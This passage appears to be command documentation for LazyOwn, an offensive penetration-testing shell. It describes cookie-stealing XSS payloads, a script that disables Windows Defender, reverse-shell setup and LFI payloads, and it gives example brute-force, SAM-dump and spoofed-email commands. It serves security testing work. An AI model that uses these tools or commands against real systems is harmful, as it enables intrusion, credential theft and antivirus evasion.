1. Ensure that `lhost`, `lport`, and `rhost` parameters are set.
2. The function generates two payloads:
- Payload 1: A script that sends cookies to the specified host and port.
- Payload 2: An image tag with an `onerror` event that fetches cookies and sends them to the specified host and port using Base64 encoding.
3. The user is prompted to choose between the two payloads, which are then copied to the clipboard.

Dependencies:
- The script uses `xclip` to copy the payloads to the clipboard.
- Ensure that `lhost`, `lport`, and `rhost` parameters are set with appropriate values.

Example:
    img2cookie
    # This will prompt you to select between two payloads. The chosen payload will be copied to the clipboard.

## disableav
Creates a Visual Basic Script (VBS) to attempt to disable antivirus settings.

This function generates a VBS script designed to modify Windows Registry settings and run PowerShell commands to disable various Windows Defender antivirus features.

Usage:
    disableav

:param line: This parameter is not used in the function.
:type line: str
:returns: None

Manual execution:
1. The function writes a VBS script to a file named `aav.vbs` in the `sessions` directory.
2. The script:
- Elevates its privileges if not already running as an administrator.
- Modifies Windows Registry settings to disable various Windows Defender features.
- Outputs PowerShell commands to disable additional Windows Defender settings.

The VBS script:
- Uses `WScript.Shell` to modify the Windows Registry for disabling Windows Defender.
- Calls PowerShell commands to further disable antivirus features.

Dependencies:
- The script must be executed on a Windows system where you have administrative privileges.
- Ensure you have appropriate permissions to modify Windows Registry settings.

Example:
    disableav
    # This will create the `aav.vbs` file with the specified content in the `sessions` directory.

## conptyshell
Downloads ConPtyShell and prepares a PowerShell command for remote access.

This function downloads the ConPtyShell PowerShell script and ZIP archive to the `sessions` directory and copies a PowerShell command to the clipboard for easy execution.

Usage:
    conptyshell

:param line: This parameter is not used in the function. The required host and port are retrieved from the `params` dictionary.
:type line: str
:returns: None

Manual execution:
1. Ensure that the `lhost` and `lport` parameters are set with the local host and port for the reverse shell.
2. The function downloads `Invoke-ConPtyShell.ps1` and `ConPtyShell.zip` to the `sessions` directory.
3. Constructs a PowerShell command to run `Invoke-ConPtyShell.ps1` with the specified local IP and port.
4. Copies the constructed command to the clipboard using `xclip`.

The constructed PowerShell command:
- Uses `Invoke-ConPtyShell.ps1` to establish a reverse shell connection to the specified `lhost` and `lport`.
- Sets the PowerShell execution policy to bypass and specifies the dimensions of the terminal window.

Dependencies:
- `wget`: For downloading files from the internet.
- `xclip`: For copying commands to the clipboard.
- Ensure `ConPtyShell` script and ZIP are compatible with your environment.

Example:
    conptyshell
    # This will download the required files and copy the PowerShell command to the clipboard.

## pwncatcs
Runs `pwncat-cs` with the specified port for listening.

This function starts a `pwncat-cs` listener on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.

Usage:
    pwncatcs <port>

:param line: The port number to use for the `pwncat-cs` listener. If not provided, it defaults to the `lport` parameter.
:type line: str
:returns: None

Manual execution:
1. Ensure that `pwncat-cs` is installed and accessible from your command line.
2. The port number can either be provided as an argument or be set in the `lport` parameter of the function.
3. Run the function to start `pwncat-cs` on the specified port.

If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.

After starting the listener, the function prints a message indicating that `pwncat-cs` is running on the specified port and another message when the session is closed.

Dependencies:
- `pwncat-cs`: A tool used for creating reverse shells or bind shells.

## pwncat
Runs `pwncat` with the specified port for listening. SELFINJECT

This function starts a `pwncat` listener on the specified local port. It can use a port defined in the `lport` parameter or a port provided as an argument.

Usage:
    pwncatcs <port>

:param line: The port number to use for the `pwncat-cs` listener. If not provided, it defaults to the `lport` parameter.
:type line: str
:returns: None

Manual execution:
1. Ensure that `pwncat-cs` is installed and accessible from your command line.
2. The port number can either be provided as an argument or be set in the `lport` parameter of the function.
3. Run the function to start `pwncat-cs` on the specified port.

If no port is provided as an argument, the function will use the port specified in the `lport` parameter. If a port is provided, it overrides the `lport` value.

After starting the listener, the function prints a message indicating that `pwncat-cs` is running on the specified port and another message when the session is closed.

Dependencies:
- `pwncat-cs`: A tool used for creating reverse shells or bind shells.

## find
Automates command execution based on a list of aliases and commands.

1. Displays available aliases and their commands.
2. Asks the user if they want to execute a specific command.
3. If confirmed, displays the alias and command with a number.
4. Executes the command and copies it to the clipboard.

:param line: The command line input containing the list of alias and command pairs.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Prepare the list of alias and command pairs in the format: "alias command".
- Provide this list as input to the function.
- Confirm the execution of the desired command when prompted.
- Manually copy the command to the clipboard if needed.

Note: Ensure `xclip` is installed and properly configured to use clipboard functionalities.

## sh
Executes a shell command directly from the LazyOwn interface.

This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell. 
It checks if a command is provided, prints a message indicating the command being executed, and then 
runs the command using `os.system`.

Usage:
    sh <command>

:param line: The shell command to be executed.
:type line: str
:raises ValueError: If no command is provided, an error message is printed indicating that a command is required.
:returns: None

Example:
    sh ls -la
    # This will execute 'ls -la' in the shell without exiting LazyOwn.

Note:
    Ensure that the command provided is safe to execute and does not include potentially harmful operations.

## pwd
Displays the current working directory and lists files, and copies the current directory path to the clipboard.

This function performs the following tasks:
1. Displays the current working directory with `pwd` and lists files in the directory using `ls`. 
2. Copies the current directory path to the clipboard using `xclip`.

Usage:
    pwd

:param line: This parameter is not used in the function but is included for consistency with other command methods.
:type line: str
:returns: None

Manual execution:
    1. The command `echo -e "[\e[96m\`pwd\`\e[0m]\e[34m" && ls && echo -en "\e[0m"` is executed to display the current working directory and list files in it.
    2. The current directory path is copied to the clipboard using the command `pwd | xclip -sel clip`.

Dependencies:
    - The function relies on `echo`, `pwd`, `ls`, and `xclip` to display the directory and copy the path to the clipboard.

Example:
    pwd
    # This will display the current working directory, list files, and copy the current directory path to the clipboard.

Note:
    Ensure that `xclip` is installed on your system for copying to the clipboard to work.

## qa
Exits the application quickly without confirmation.

This function performs the following tasks:
1. Prints an exit message with formatting.
2. Terminates the `tmux` session named `lazyown_sessions` if it exists.
3. Kills all running `openvpn` processes.
4. Exits the program with a status code of 0.

Usage:
    qa

:param line: This parameter is not used in the function but is included for consistency with other command methods.
:type line: str
:returns: None

Manual execution:
    1. The command `tmux kill-session -t lazyown_sessions 2>/dev/null` is executed to kill the tmux session named `lazyown_sessions`, suppressing errors if the session does not exist.
    2. The command `killall openvpn 2>/dev/null` is executed to terminate all running `openvpn` processes, suppressing errors if no such processes are found.
    3. The program is exited with a status code of 0 using `sys.exit(0)`.

Dependencies:
    - The function relies on `tmux`, `killall`, and `sys` to perform the exit operations.

Example:
    qa
    # This will print an exit message, terminate the tmux session and openvpn processes, and exit the program.

Note:
    Ensure that `tmux` and `openvpn` are installed and running for their respective commands to have an effect.

## ignorearp
Configures the system to ignore ARP requests by setting a kernel parameter.

This function performs the following tasks:
1. Prints a message indicating the command that will be executed.
2. Executes the command `echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore` with elevated privileges using `sudo` to configure the system to ignore ARP requests.
3. Prints a confirmation message indicating that the operation is complete.

Usage:
    ignorearp

:param line: This parameter is not used in the function but is included for consistency with other command methods.
:type line: str
:returns: None

Manual execution:
    1. The command `sudo bash -c 'echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore'` is executed to set the `arp_ignore` parameter to `1`, which configures the system to ignore ARP requests.

Dependencies:
    - The function requires `sudo` to run the command with elevated privileges.

Example:
    ignorearp
    # This will set the `arp_ignore` parameter to `1` to ignore ARP requests.

Note:
    Ensure that you have the necessary permissions to use `sudo` and that the `arp_ignore` parameter can be modified on your system.

## ignoreicmp
Configures the system to ignore ICMP echo requests by setting a kernel parameter.

This function performs the following tasks:
1. Prints a message indicating the command that will be executed.
2. Executes the command `echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all` with elevated privileges using `sudo` to configure the system to ignore ICMP echo requests (ping).
3. Prints a confirmation message indicating that the operation is complete.

Usage:
    ignoreicmp

:param line: This parameter is not used in the function but is included for consistency with other command methods.
:type line: str
:returns: None

Manual execution:
    1. The command `sudo bash -c 'echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all'` is executed to set the `icmp_echo_ignore_all` parameter to `1`, which configures the system to ignore ICMP echo requests (ping).

Dependencies:
    - The function requires `sudo` to run the command with elevated privileges.

Example:
    ignoreicmp
    # This will set the `icmp_echo_ignore_all` parameter to `1` to ignore ICMP echo requests.

Note:
    Ensure that you have the necessary permissions to use `sudo` and that the `icmp_echo_ignore_all` parameter can be modified on your system.

## acknowledgearp
Configures the system to acknowledge ARP requests by setting a kernel parameter.

This function performs the following tasks:
1. Prints a message indicating the command that will be executed.
2. Executes the command `echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore` with elevated privileges using `sudo` to configure the system to acknowledge ARP requests.
3. Prints a confirmation message indicating that the operation is complete.

Usage:
    acknowledgearp

:param line: This parameter is not used in the function but is included for consistency with other command methods.
:type line: str
:returns: None

Manual execution:
    1. The command `sudo bash -c 'echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore'` is executed to set the `arp_ignore` parameter to `0`, which configures the system to acknowledge ARP requests.

Dependencies:
    - The function requires `sudo` to run the command with elevated privileges.

Example:
    acknowledgearp
    # This will set the `arp_ignore` parameter to `0` to acknowledge ARP requests.

Note:
    Ensure that you have the necessary permissions to use `sudo` and that the `arp_ignore` parameter can be modified on your system.

## acknowledgeicmp
Configures the system to respond to ICMP echo requests by setting a kernel parameter.

This function performs the following tasks:
1. Prints a message indicating the command that will be executed.
2. Executes the command `echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all` with elevated privileges using `sudo` to configure the system to respond to ICMP echo requests.
3. Prints a confirmation message indicating that the operation is complete.

Usage:
    acknowledgeicmp

:param line: This parameter is not used in the function but is included for consistency with other command methods.
:type line: str
:returns: None

Manual execution:
    1. The command `sudo bash -c 'echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all'` is executed to set the `icmp_echo_ignore_all` parameter to `0`, which configures the system to respond to ICMP echo requests.

Dependencies:
    - The function requires `sudo` to run the command with elevated privileges.

Example:
    acknowledgeicmp
    # This will set the `icmp_echo_ignore_all` parameter to `0` to allow responses to ICMP echo requests.

Note:
    Ensure that you have the necessary permissions to use `sudo` and that the `icmp_echo_ignore_all` parameter can be modified on your system.

## clock
Displays the current date and time, and runs a custom shell script.

This function performs the following actions:
1. Constructs a command to get the current date and time in a specified format.
2. Uses `figlet` to display the current date and time in a large ASCII text format.
3. Runs a custom shell script (`cal.sh`) to display additional information or perform further actions related to the clock.

Usage:
    clock

:param line: This parameter is not used in the function.
:type line: str
:returns: None

Manual execution:
To manually use this function:
1. Ensure that `figlet` is installed on your system for displaying text in large ASCII format.
2. Make sure `cal.sh` exists in the `modules` directory and is executable.
3. Run the function to see the current date and time displayed in large ASCII text, followed by the execution of `cal.sh`.

Note: The function sets the terminal color to white before displaying the date and time, then sets it to green before running the `cal.sh` script. Finally, it resets the terminal color.

Dependencies:
- `figlet`: For displaying text in large ASCII format.
- `cal.sh`: A custom shell script located in the `modules` directory.

## ports
Lists all open TCP and UDP ports on the local system.

This function performs the following actions:
1. Calls the `get_open_ports` function to retrieve lists of open TCP and UDP ports.
2. Prints a header for open TCP ports.
3. Iterates over the list of open TCP ports, printing each IP address and port number.
4. Prints a header for open UDP ports.
5. Iterates over the list of open UDP ports, printing each IP address and port number.

Usage:
    ports

:param line: This parameter is not used in the function.
:type line: str
:returns: None

Manual execution:
To manually use this function:
1. Ensure the `get_open_ports` function is defined and properly implemented to return lists of open TCP and UDP ports.
2. Run the function to display open TCP and UDP ports on the local system.

Note: The `get_open_ports` function should return two lists of tuples: one for TCP ports and one for UDP ports. Each tuple should contain an IP address and a port number.

## ssh
Connects to an SSH host using credentials from a file and a specified port.

This function performs the following actions:
1. Retrieves the remote host (`rhost`) from the parameters.
2. Checks if the `rhost` is valid using the `check_rhost` function.
3. Sets the SSH port to the value provided in the `line` parameter.
4. Checks if the `credentials.txt` file exists in the `./sessions` directory.
5. Reads credentials (username and password) from the `credentials.txt` file, where each line is formatted as `user:password`.
6. Constructs and executes an SSH command using `sshpass` to handle password authentication and `ssh` to initiate the connection.
7. Displays the SSH command being executed.

Usage:
    ssh <port>

:param line: The port number to use for the SSH connection.
:type line: str
:returns: None

Manual execution:
To manually use this function:
1. Ensure `sessions/credentials.txt` exists and contains valid SSH credentials in the format `user:password`.
2. Run the function with the port number as an argument.
3. The function will attempt to connect to the SSH host using each set of credentials and the specified port.

Note: Ensure `sshpass` is installed on your system for password-based SSH authentication. If `sshpass` is not available, you may need to install it or use an alternative method for SSH authentication.

## ftp
Connects to an ftp host using credentials from a file and a specified port.

This function performs the following actions:
1. Retrieves the remote host (`rhost`) from the parameters.
2. Checks if the `rhost` is valid using the `check_rhost` function.
3. Sets the ftp port to the value provided in the `line` parameter.
4. Checks if the `credentials.txt` file exists in the `./sessions` directory.
5. Reads credentials (username and password) from the `credentials.txt` file, where each line is formatted as `user:password`.
6. Constructs and executes an ftp command using `sshpass` to handle password authentication and `ftp` to initiate the connection.
7. Displays the ftp command being executed.

Usage:
    ftp <port>

:param line: The port number to use for the ftp connection.
:type line: str
:returns: None

Manual execution:
To manually use this function:
1. Ensure `sessions/credentials.txt` exists and contains valid ftp credentials in the format `user:password`.
2. Run the function with the port number as an argument.
3. The function will attempt to connect to the ftp host using each set of credentials and the specified port.

Note: Ensure `sshpass` is installed on your system for password-based SSH authentication. If `sshpass` is not available, you may need to install it or use an alternative method for SSH authentication.

## cports
Generates a command to display TCP and UDP ports and copies it to the clipboard.

This function performs the following actions:
1. Defines a command to display TCP and UDP ports from `/proc/net/tcp` and `/proc/net/udp`, respectively.
2. The command extracts and formats IP addresses and port numbers from these files.
3. Prints the generated command to the console for verification.
4. Copies the command to the clipboard using `xclip`.

Usage:
    cports  # Generates the command and copies it to the clipboard

:param line: This parameter is not used in this function.
:type line: str
:returns: None

Manual execution:
To manually use this function:
1. Run the function to print the command and copy it to the clipboard.
2. The command can be pasted into a terminal to display TCP and UDP ports.

Note: Ensure `xclip` is installed on your system for copying to the clipboard. If `xclip` is not available, you may need to install it or use an alternative method for copying to the clipboard.

## vpn
Connect to a VPN by selecting from available .ovpn files.

This function performs the following actions:
1. Lists all `.ovpn` files in the current directory, sorted alphabetically.
2. Handles cases with and without arguments:
- Without arguments: Lists available `.ovpn` files and prompts the user to select one by number.
- With a single argument: Treats the argument as a number and attempts to connect to the corresponding `.ovpn` file.
3. Connects to the selected `.ovpn` file using `openvpn` and displays appropriate messages.
4. Handles invalid input with error messages.

Usage:
    vpn           # List available .ovpn files and select one to connect to
    vpn <number>  # Connect directly to the .ovpn file corresponding to the number

:param line: The number of the .ovpn file to connect to, or an empty string to list available files.
:type line: str
:returns: None

Manual execution:
To manually use this function:
1. Run the function with no arguments to list available `.ovpn` files.
2. Choose a file by entering the corresponding number.
3. Alternatively, run the function with a number argument to connect directly to the specified `.ovpn` file.

Note: Ensure you have the necessary permissions and the `openvpn` command is available on your system.

## id_rsa
Create an SSH private key file and connect to a remote host using SSH.

This function performs the following actions:
1. Checks if the provided remote host (`rhost`) is valid.
2. Verifies that a username is provided as an argument.
3. Creates an SSH private key file in the `sessions` directory with a name based on the provided username.
4. Opens the created file in the `nano` text editor for the user to paste the private key.
5. Sets the file permissions to read-only for the owner (600).
6. Optionally formats the key if the user chooses to.
7. Connects to the remote host via SSH using the created private key.
8. Displays a warning message when the SSH connection is closed.

Usage:
    id_rsa <username>

:param line: The username for SSH connection and private key file naming.
:type line: str
:returns: None

Manual execution:
To manually use this function:
1. Run the function with the username argument, e.g., `id_rsa myuser`.
2. Paste the private key into the `nano` editor when prompted.
3. Save and exit the editor.
4. The SSH connection will be established using the private key.

Note: Ensure you have the necessary permissions to create files and connect via SSH.

## www
Start a web server using Python 3 and display relevant network information.

This function performs the following actions:
1. Displays global network interfaces and their IP addresses.
2. Copies the IP address of the `tun0` interface to the clipboard.
3. Displays the current working directory and contents of the `sessions` directory.
4. Starts a Python 3 HTTP server on port 80 in the `sessions` directory.
5. Displays a message indicating that the web server is running and will show the shutdown message when stopped.

Usage:
    www

:param line: This parameter is used to pass the port as an argument by default is 80
:type line: str
:returns: None

Manual execution:
To manually use this function, run it to start the web server and follow the on-screen instructions to see the network information and server status.

Note: Ensure you have `xclip` installed for clipboard operations and have the necessary permissions to run the HTTP server.

## wrapper
Copy payloads to clipboard for Local File Inclusion (LFI) attacks.

This function provides three payload options for Local File Inclusion (LFI) attacks and copies the selected payload to the clipboard using `xclip`. The user is prompted to choose which payload to copy.

Usage:
    wrapper

:param line: This parameter is not used in the function.
:type line: str
:returns: None

Manual execution:
To manually use this function, run it and follow the prompts to select one of the three predefined payloads. The selected payload will be copied to the clipboard.

Note: Ensure `xclip` is installed on your system for clipboard operations.

## swaks
Sends an email using `swaks` (Swiss Army Knife for SMTP).

This method constructs and executes a `swaks` command to send an email from an attacker’s address
to a victim’s address, with a specified message body. The command is executed using the SMTP server
address provided in the parameters.

Parameters:
- `line`: (str) Input line that is not used in this function.

Functionality:
1. Retrieves the SMTP server address (`rhost`) from the object's parameters.
2. Checks if the server address is valid using `check_rhost()`.
3. Prompts the user for the sender's email address (`from_attacker`).
4. Prompts the user for the recipient's email address (`to_victim`).
5. Prompts the user for the message body (`body`).
6. Constructs the `swaks` command with the provided options.
7. Executes the command using `os.system()`.
8. Copies the command to the clipboard using `copy2clip()`.

Example usage:
>>> do_swaks("line")

swaks --from attacker@hell.com --to victim@heaven.com,victim2@heaven.com,victim3@heaven.com   --body "testing" --server 127.0.0.1

## samrdump
Run `impacket-samrdump` to dump SAM data from specified ports.

This function executes `impacket-samrdump` to retrieve SAM data from the target host on ports 139 and 445. It first checks if the `rhost` parameter is valid, and if so, it runs the command for both ports.

Usage:
    samrdump <target_host>

:param line: The target host to dump SAM data from.
:type line: str
:returns: None

Manual execution:
To manually run this task, specify the target host. The function will attempt to dump SAM data from the host on ports 139 and 445.
impacket-samrdump -port 445 10.10.10.10
Note: Ensure that `impacket-samrdump` is installed and properly configured on your system.

## urlencode
Encode a string for URL.

This function takes a string as input, encodes it for URL compatibility using the `quote` function, and prints the encoded result.

Usage:
    urlencode <string_to_encode>

:param line: The string to encode for URL.
:type line: str
:returns: None

Manual execution:
To manually run this task, provide a string to be URL-encoded as an argument. The function will encode it and print the result.

Note: If no input is provided or the input is only whitespace, an error message will be displayed.

## urldecode
Decode a URL-encoded string.

This function takes a URL-encoded string as input, decodes it using the `unquote` function, and prints the decoded result.

Usage:
    urldecode <url_encoded_string>

:param line: The URL-encoded string to decode.
:type line: str
:returns: None

Manual execution:
To manually run this task, provide a URL-encoded string as an argument. The function will decode it and print the result.

Note: If no input is provided or the input is only whitespace, an error message will be displayed.

## lynis
Performs a Lynis audit on the specified remote system.

This function executes the `modules/lazylynis.sh` script with the target host defined in the `rhost` parameter. It is used to perform a security audit of the remote system using Lynis.

Usage:
    lynis

:param line: This parameter is not used in the current implementation.
:type line: str
:returns: None

Manual execution:
To manually run this task, ensure that the `modules/lazylynis.sh` script is available and executable. Provide the target host in the format `lynis`.
sudo lynis audit system remote 10.10.10.10 more info check modules/lazylynis.sh
Note: The function assumes that `rhost` is a valid host address. If `rhost` is not valid, it will print an error message. For more details, check `modules/lazylynis.sh`.

## snmpcheck
Performs an SNMP check on the specified target host.

This function executes the `snmp-check` command against the target host defined in the `rhost` parameter.

Usage:
    snmpcheck

:param line: This parameter is not used in the current implementation.
:type line: str
:returns: None

Manual execution:
To manually run this task, ensure that `snmp-check` is installed and provide a target host in the format `snmpcheck`.
snmp-check 10.10.10.10
Note: The function assumes that `rhost` is a valid host address. If `rhost` is not valid, it will print an error message.

## encode
Encodes a string using the specified shift value and substitution key.

This function encodes the given string by applying a shift value and a substitution key.

Usage:
    encode <shift_value> <substitution_key> <string>

:param line: The input string containing the shift value, substitution key, and the string to be encoded. The format should be '<shift_value> <substitution_key> <string>'.
:type line: str
:returns: None

Manual execution:
To manually run this task, provide a shift value (integer), a substitution key, and the string to encode in the format `encode <shift_value> <substitution_key> <string>`.

Note: The function assumes the shift value is an integer. If the shift value is not an integer, it will print an error message.

## decode
Decode a string using the specified shift value and substitution key.

This function decodes the given string by applying a shift value and a substitution key to reverse the encoding process.

Usage:
    decode <shift_value> <substitution_key> <string>

:param line: The input string containing the shift value, substitution key, and the string to be decoded. The format should be '<shift_value> <substitution_key> <string>'.
:type line: str
:returns: None

Manual execution:
To manually run this task, provide a shift value (integer), a substitution key, and the string to decode in the format `decode <shift_value> <substitution_key> <string>`.

Note: The function assumes the shift value is an integer. If the shift value is not an integer, it will print an error message.

## cred
Display the credentials stored in the `credentials.txt` file and copy the password to the clipboard.

This function reads the stored credentials from a file named `credentials.txt` located in the `sessions` directory.
The file should be in the format `username:password`. If the file does not exist, an error message will be printed
instructing the user to create the credentials file first. The function extracts the username and password from the file,
prints them, and copies the password to the clipboard using `xclip`.

:param line: A string parameter that is not used in this function. It is included for compatibility with command-line
            interface functions.

:returns: None

Manual execution:
To manually perform the equivalent actions, follow these steps:

    1. Ensure the file `sessions/credentials.txt` exists and contains credentials in the format `username:password`.
    2. Read the file and extract the username and password.
    3. Print the username and password to the console.
    4. Use the `xclip` tool to copy the password to the clipboard. Example command:

        echo '<password>' | xclip -sel clip

Example:
If `sessions/credentials.txt` contains `admin:password123`, the function will print:

    User : admin
    Pass : password123

The password `password123` will be copied to the clipboard.

Note:
Ensure `xclip` is installed on your system for copying to the clipboard. The function assumes that `xclip` is available
and correctly configured.

## hostdiscover
Discover active hosts in a subnet by performing a ping sweep.

This method constructs and executes a bash script that performs a 
ping sweep on the specified subnet to identify active hosts. The 
subnet is determined from the 'rhost' parameter. For each host in 
the subnet, a ping request is sent, and active hosts are reported.

Parameters:
- line (str): The input line argument is not used in this function.

Behavior:
- Extracts the first three octets of the 'rhost' parameter to form 
the base IP pattern.
- Constructs a bash script to ping each IP address in the subnet 
(from .1 to .254) and reports active hosts.
- The generated bash script is displayed to the user.
- Prompts the user to confirm whether they want to execute the 
generated command.
- If the user confirms, executes the command using `os.system()`.
- If the user declines, copies the command to the clipboard using 
`copy2clip()`.

Side Effects:
- Executes system commands and may affect the system environment.
- May modify the clipboard content if the user chooses not to execute.

Notes:
- Ensure that the 'rhost' parameter is a valid IP address and that 
the `check_rhost()` function is implemented to validate the IP.
- `print_msg()` is used to display the constructed command to the 
user.
- `copy2clip()` is used to copy the command to the clipboard if 
not executed.

Example:
>>> do_hostdiscover("example_input")

## portdiscover
Scan all ports on a specified host to identify open ports.

This method constructs and executes a bash script that performs a 
port scan on the specified host to determine which ports are open. 
It scans all ports from 0 to 65535 and reports any that are open.

Parameters:
- line (str): The input line argument is not used in this function.

Behavior:
- Extracts the 'rhost' parameter to determine the target IP address.
- Constructs a bash script to scan all ports on the target IP address 
and report open ports.
- The generated bash script is displayed to the user.
- Prompts the user to confirm whether they want to execute the 
generated command.
- If the user confirms, executes the command using `os.system()`.
- If the user declines, copies the command to the clipboard using 
`copy2clip()`.

Side Effects:
- Executes system commands and may affect the system environment.
- May modify the clipboard content if the user chooses not to execute.

Notes:
- Ensure that the 'rhost' parameter is a valid IP address and that 
the `check_rhost()` function is implemented to validate the IP.
- `print_msg()` is used to display the constructed command to the 
user.
- `copy2clip()` is used to copy the command to the clipboard if 
not executed.

Example:
>>> do_portdiscover("example_input")

## portservicediscover
Scan all ports on a specified host to identify open ports and associated services.

This method constructs and executes a bash script that performs a 
port scan on the specified host to determine which ports are open 
and identifies any services running on those open ports. It scans 
all ports from 0 to 65535.

Parameters:
- line (str): The input line argument is not used in this function.

Behavior:
- Extracts the 'rhost' parameter to determine the target IP address.
- Constructs a bash script to scan all ports on the target IP address 
and report open ports along with any associated services.
- The generated bash script is displayed to the user.
- Prompts the user to confirm whether they want to execute the 
generated command.
- If the user confirms, executes the command using `os.system()`.
- If the user declines, copies the command to the clipboard using 
`copy2clip()`.

Side Effects:
- Executes system commands and may affect the system environment.
- Requires `sudo` privileges to use `lsof` for identifying services.
- May modify the clipboard content if the user chooses not to execute.

Notes:
- Ensure that the 'rhost' parameter is a valid IP address and that 
the `check_rhost()` function is implemented to validate the IP.
- `print_msg()` is used to display the constructed command to the 
user.
- `copy2clip()` is used to copy the command to the clipboard if 
not executed.

Example:
>>> do_portservicediscover("example_input")

## rot
Apply a ROT (rotation) substitution cipher to the given string.

This function rotates each character in the input string by the specified number of positions in the alphabet. It supports rotation values between 1 and 27. 

Usage:
    rot <number> '<string>'

:param line: The input string containing the number and the text to be rotated. The format should be '<number> '<string>' where <number> is the rotation amount and <string> is the text to be ciphered.
:type line: str
:returns: None

Manual execution:
To manually run this task, provide a number (rotation amount) and a string in the format `rot <number> '<string>'`. Ensure the number is between 1 and 27.

Note: The function assumes that the rotation number is an integer between 1 and 27. If the number is out of range or not a valid integer, it will print an error message.

## hydra
Uses Hydra to perform a brute force attack on a specified HTTP service with a user and password list.

1. Checks if a wordlist is provided; if not, prints an error message.
2. Validates the remote host parameter.
3. Checks if the `line` argument is provided, which should include the path to crack and the port.
4. If the `line` argument is valid, splits it into arguments for the path and port.
5. Asks the user if they want to use a small dictionary from a JSON file.
6. Constructs and prints the Hydra command with the provided parameters.
7. Executes the Hydra command using `os.system`.

:param line: The path to crack and port for the Hydra command, formatted as 'path port'.
:type line: str
:returns: None

Manual execution:
To manually run this task, you would:
- Provide the path to crack and the port as arguments to this function in the format 'path port'.
- Ensure that the user list and wordlist are set correctly.
- hydra -f -L sessions/users.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.9 -s 5000 http-get /v2/
Note: Ensure that the remote host and wordlist parameters are valid, and that the path and port are specified correctly in the `line` argument.

## medusa
Uses medusa to perform a brute force attack on a specified ssh service with a user and password list.

1. Checks if a wordlist is provided; if not, prints an error message.
2. Validates the remote host parameter.
3. Asks the user if they want to use a small dictionary from a JSON file.
4. Constructs and prints the medusa command with the provided parameters.
5. Executes the medusa command using `os.system`.

:param line: The port if is't default port.
:type line: str
:returns: None

Manual execution:
To manually run this task, you would:
- Provide the path to crack and the port as arguments to this function in the format 'path port'.
- Ensure that the user list and wordlist are set correctly.
- medusa -h 10.10.10.10 -U sessions/users.txt -P /usr/share/wordlists/rockyou.txt -e ns -M ssh"
Note: Ensure that the remote host and wordlist parameters are valid, and that the path and port are specified correctly in the `line` argument.

## nmapscript
Perform an Nmap scan using a specified script and port.

:param line: A string containing the Nmap script and port, separated by a space. Example: "http-enum 80".

:returns: None

Manual execution:
To manually run an Nmap scan with a script and port, use the following command format:

    nmap --script <script> -p <port> <target> -oN <output-file>

Example:
If you want to use the script `http-enum` on port `80` for the target `10.10.10.10`, you would run:

    nmap --script http-enum -p 80 10.10.10.10 -oN sessions/webScan_10.10.10.10

Ensure you have the target host (`rhost`) set in the parameters and provide the script and port as arguments. The results will be saved in the file `sessions/webScan_<rhost>`.

## encoderpayload
Applies various obfuscations to a given command line string to create multiple obfuscated versions.

1. Defines a helper function `double_base64_encode(cmd)` that performs double Base64 encoding on a given command.
2. Defines the `apply_obfuscations(cmd)` function to create a list of obfuscated commands using different techniques.
3. Applies these obfuscations to the provided `line` argument and prints each obfuscated command.

:param line: The command line string to be obfuscated.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would:
- Provide the command you want to obfuscate as the argument to this function.
- The function will generate various obfuscated versions of the command and print them.

Note: Ensure that the command is properly formatted and valid to avoid errors during obfuscation. The obfuscations may involve different encoding and string manipulation techniques.

## smtpuserenum
Enumerates SMTP users using the `smtp-user-enum` tool with the VRFY method.

1. Checks if the `rhost` (remote host) parameter is set:
- If not set, displays an error message and exits the function.

2. Checks if the `usrwordlist` (user wordlist) parameter is provided:
- If not provided, displays an error message indicating that the `p` or `payload` parameter should be used to load payloads.

3. If both parameters are provided:
- Displays the command that will be executed for user enumeration.
- Runs `sudo smtp-user-enum -M VRFY -U <usrwordlist> -t <rhost>` to perform user enumeration.

:param line: Not used in this function.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Ensure that the `rhost` parameter is set with the target IP address using `set rhost <IP>`.
- Load the user wordlist using the `set usrwordlist <path>` command.
- Execute the command `sudo smtp-user-enum -M VRFY -U <usrwordlist> -t <rhost>`.
- Ex: sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists-master/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.10
Note: Ensure that you have the necessary permissions to run `smtp-user-enum` with `sudo` and that the wordlist file exists at the specified path.

## sshd
Starts the SSH service and displays its status.

1. Executes the command to start the SSH service:
- Runs `sudo systemctl start ssh` to initiate the SSH service.

2. Displays the status of the SSH service:
- Runs `sudo systemctl status ssh` to show the current status of the SSH service.

:param line: Not used in this function.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Execute `sudo systemctl start ssh` to start the SSH service.
- Run `sudo systemctl status ssh` to check the status of the SSH service.

Note: Ensure that you have the necessary permissions to start services using `sudo` and that the SSH service is installed on your system.

## nmapscripthelp
Provides help to find and display information about Nmap scripts.

1. Checks if an argument is provided:
- If no argument is given, displays an error message indicating the need to pass a script name.

2. Executes a command to display script help:
- Runs `nmap --script-help` with the provided argument (appending a wildcard `*` to match script names).
- Prints a message with the command being executed and provides further instructions for using the Nmap script.

3. Prints a message suggesting the next step:
- Provides a suggestion for running Nmap with the appropriate script and options based on the search results.

:param line: The script or keyword to search for in the Nmap script help output.
:type line: str
:returns: None

Manual execution:
To manually run these tasks, you would need to:
- Run `nmap --script-help` with the specific script name or keyword.
- Use the script names in Nmap commands to run scans with the desired scripts.

Note: Ensure that `nmap` is installed and accessible in the system's PATH.

## apropos
Search for commands matching the given parameter in the cmd interface and optionally extend the search using the system's `apropos` command.

:param line: The search term to find matching commands.

:returns: None

Manual execution:
To manually search for commands matching a term using the `apropos` command, use the following command:

    apropos <search_term>

Example:
    apropos network

The `apropos` command will search for commands and documentation that match the given search term.

The function also searches within the available commands in the cmd interface.

## searchhash
Helps to find hash types in Hashcat by searching through its help output.

